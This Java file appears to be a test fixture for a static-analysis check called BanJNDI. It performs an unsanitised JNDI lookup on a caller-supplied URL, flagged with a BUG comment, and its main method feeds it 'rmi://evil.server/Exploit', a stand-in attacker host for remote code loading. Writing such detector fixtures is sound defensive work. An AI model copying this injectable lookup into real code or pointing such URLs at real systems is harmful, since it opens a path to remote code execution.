import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    private boolean getUnreachableCondition() { // New method for dynamic condition
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI

        if (getUnreachableCondition()) { // Unreachable if statement
            throw new IllegalStateException("This code should not be reached.");
        }

        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}